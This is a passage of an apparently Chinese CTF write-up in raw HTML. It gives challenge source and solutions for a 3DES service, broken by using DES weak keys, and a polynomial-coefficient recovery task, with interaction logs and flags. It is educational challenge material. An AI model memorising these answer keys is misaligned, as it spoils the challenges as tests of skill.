punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    x <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Give me XXXX: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">4</span> <span class=\"token keyword\">or</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>proof<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> digest<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Right!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">enc</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        key <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        msg <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        des <span class=\"token operator\">=</span> DES3<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span>DES3<span class=\"token punctuation\">.</span>MODE_ECB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        ct <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>des<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>pad<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">return</span> bytes_to_long<span class=\"token punctuation\">(</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">return</span> Exception</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">service</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    cnt <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> proof_of_work<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Simple DES Encryption Service'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">while</span> cnt<span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1. Encrypt\\n2. Get encrypted flag.'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        choice <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">if</span> choice <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Input msg:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            msg <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Input key:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            key <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token keyword\">elif</span> choice <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Input key:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>            key <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>            exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        cnt<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Bye!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    service<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Something goes wrong...\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token operator\">+</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>去输入相同的 0xFEFEFEFEFEFEFEFE1F1F1F1F0E0E0E0EFEFEFEFEFEFEFEFE 变成 2DES</p>\n<blockquote>\n<p>sha256(XXXX+bdc8ArQJbMwUCQh7) == cd4a27077eaea67b872c59b0232ae722e179992aa8b2c08624667301a9a516d7<br>\nGive me XXXX: KfXV<br>\nRight!<br>\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||<br>\nSimple DES Encryption Service<br>\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||</p>\n<ol>\n<li>Encrypt</li>\n<li>Get encrypted flag.</li>\n</ol>\n<blockquote>\n<p>2<br>\nInput key:<br>\n6252485650149870250738853120274631817958237138334041177854<br>\n5645108062031882523941457412438800103538695650524004750720</p>\n</blockquote>\n<ol>\n<li>Encrypt</li>\n<li>Get encrypted flag.</li>\n</ol>\n<blockquote>\n<p>1<br>\nInput msg:<br>\n5645108062031882523941457412438800103538695650524004750720<br>\nInput key:<br>\n6252485650149870250738853120274631817958237138334041177854<br>\n37699681561444816228091816433931698303804192466855953956737310357621942568417<br>\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||<br>\nBye!</p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token number\">37699681561444816228091816433931698303804192466855953956737310357621942568417</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"just-need-one\"><a class=\"markdownIt-Anchor\" href=\"#just-need-one\">#</a> Just need One</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> random </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> hashlib </pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>flag <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>environ<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"FLAG\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>DEBUG <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>banner <span class=\"token operator\">=</span> <span class=\"token string\">'|'</span><span class=\"token operator\">*</span><span class=\"token number\">70</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"==DEBUG MODE==\"</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">proof_of_work</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    proof <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">.</span>ascii_letters<span class=\"token operator\">+</span>string<span class=\"token punctuation\">.</span>digits<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    digest <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span>proof<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sha256(XXXX+%s) == %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>proof<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> digest<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    x <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Give me XXXX: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">4</span> <span class=\"token keyword\">or</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span>proof<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> digest<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Right!\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>  </pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> proof_of_work<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    parms <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>random<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    res <span class=\"token operator\">=</span> res <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Give me x calculating f(x) :\\n> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> res <span class=\"token operator\">>=</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">32</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Give me something smaller.\\n\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token operator\">+</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    cnt <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        cnt <span class=\"token operator\">+=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span>_<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>parms<span class=\"token punctuation\">[</span>_<span class=\"token punctuation\">]</span>  </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cnt<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    ans <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Give me Coefficients :\\n> '</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    ans <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> ans<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">if</span> ans <span class=\"token operator\">==</span> parms<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Congrats! Your flag is:'</span><span class=\"token punctuation\">,</span>flag<span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Something goes wrong...\\n\"</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token operator\">+</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>大系数去乘，然后以 a+xb+x**2 *c = d</p>\n<p>​\t\t\t\t\t\t\t\td%x = a</p>\n<p>​\t\t\t\t\t\t\t\t(d-a)%x**2 = x*b</p>\n<p>​\t\t\t\t\t\t\t\tb=(d-a)%x**2/x</p>\n<p>思想去写脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">177754717040592981569551572031377340054191998150089284463636682539461200861660419277793044549808255858312075085076505728657329359128807787546446926703049420827644737041142510507604014302969048704502041579803985861076553232404872140427326979171833835167928462193868397362636669260261571017153010705552082170286101066366490706565697132560168077183348017264333167651710949131724270642891881280794067160062678045612036087150089948031521050726232296861427576086790342602842186707873382193949343692973498412664984895679933538279823670239965559948652106454011062316457810423425702426952467809946501500611115441733702708710521032114459847542665622625595031556945567463443773524673751241239124703927710925044937658332481442388137350163388181450227409991519320342433196040433371356835579779793698231120173813569544459871899939201083549425467819318395410861748062368483192273232471725365632400229155722855023939343540817517380575307485589891556485415820858077584894545989502703707116260404851070263159193834020747388870400998058161372220675478753848280221136901374387028849386044822121169476710769209034711358518243519469182938739564079866844787061356058699851567858225388803202946119417521003020418983989617334074034864880878802084304236313660</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>y <span class=\"token operator\">=</span> <span class=\"token number\">4294967295</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>coefficients <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">127</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    coefficients<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c <span class=\"token operator\">//</span> <span class=\"token punctuation\">(</span>y<span class=\"token operator\">**</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    c <span class=\"token operator\">-=</span> coefficients<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>y<span class=\"token operator\">**</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> coef <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>coefficients<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    b<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>coef<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote Alg0r1thm_1s_s0_S1mpl3!=\"\">\n<p>sha256(XXXX+suYfKbD49Qo8nlg1) == ab021ffa2d6f8cc251b12fdec4ac9bce3d794230209d4aee1816e881a069e115<br>\nGive me XXXX: VXtD<br>\nRight!<br>\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||<br>\nGive me x calculating f(x) :</p>\n<blockquote>\n<p>4294967295<br>\n177754717040592981569551572031377340054191998150089284463636682539461200861660419277793044549808255858312075085076505728657329359128807787546446926703049420827644737041142510507604014302969048704502041579803985861076553232404872140427326979171833835167928462193868397362636669260261571017153010705552082170286101066366490706565697132560168077183348017264333167651710949131724270642891881280794067160062678045612036087150089948031521050726232296861427576086790342602842186707873382193949343692973498412664984895679933538279823670239965559948652106454011062316457810423425702426952467809946501500611115441733702708710521032114459847542665622625595031556945567463443773524673751241239124703927710925044937658332481442388137350163388181450227409991519320342433196040433371356835579779793698231120173813569544459871899939201083549425467819318395410861748062368483192273232471725365632400229155722855023939343540817517380575307485589891556485415820858077584894545989502703707116260404851070263159193834020747388870400998058161372220675478753848280221136901374387028849386044822121169476710769209034711358518243519469182938739564079866844787061356058699851567858225388803202946119417521003020418983989617334074034864880878802084304236313660<br>\nGive me Coefficients :<br>\n1876237120,626172452,1627047528,1148123460,1348630515,1698481812,1446873642,4042654229,4228750952,999297977,3552395832,2965839588,2993162711,2002311193,1338287959,2340833802,2036214335,1615808961,958146830,1952401696,492154317,1317385040,537277267,3393053693,3036404066,1167705348,2797839788,1251470952,1961291670,3182242798,3808389609,2352252557,3598388818,838095969,1866892340,2674355309,1376111052,3358914062,461352865,1783381454,1993597578,1271383177,2234587463,4081359548,1689410111,4067056375,3285718523,3734989195,2508740453,2862561332,4160217917,3484830478,429421860,2404102246,4187015464,3046521226,2522208042,2138126411,292726535,4003967769,461802762,2675027708,718837678,1568030890,2846503828,4282272406,4062505778,1981908433,1283603189,4113151761,1820754298,1778870069,180426342,2373682290,173348890,3732714533,1692672433,1383715836,3071388801,1699434732,2025585879,1856716817,1482988535,507687879,2114539938,2295960531,1034475256,661384657,265513629,2619999386,909106051,2930653276,3805388808,207958940,544893102,2414669217,3137837770,812512933,2668067210,3248501708,334422578,2748607715,1766441143,1581762636,3122895940,1933908340,160370242,1114312470,66011321,4239365568,891117060,3632701542,1469123062,2873832673,1246879161,3402226432,2484827592,528672899,196357980,210761372,2432808873,146191013,2292602129,1250087457,2599643068,3549592068,2887559002,731002342<br>\nCongrats! Your flag is: SYC</p>\n</blockquote>\n</blockquote>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"nc_pwntools\"><a class=\"markdownIt-Anchor\" href=\"#nc_pwntools\">#</a> nc_pwntools</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td 